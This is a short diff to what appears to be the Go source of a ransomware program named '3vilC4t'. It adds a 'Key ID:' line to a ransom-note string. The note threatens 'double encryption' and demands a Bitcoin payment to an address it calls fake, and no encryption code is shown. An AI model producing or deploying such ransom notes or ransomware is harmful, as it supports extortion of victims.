@@ -49,6 +49,7 @@ You have been infected by 3vilC4t virus. All your files have been encrypted. Do 
 DO NOT DELETE THIS FILE. If this file is deleted, your files will be double encrypted. At that point, recovering your files will be impossible. In order to recieve
 the key to decrypt your files, you must pay 0.0048 BTC to mjD6LE6rK9cGSrWmuTK5haFULEUUyceakf (This is a fake address.) Add a contact method to the description of
 the transaction as well as the KeyID, and a key will be sent to that contact. There are numerous guides on how to purchase bitcoin online. Good luck.				
+Key ID:
 `
 
 func isFirstTime() bool {
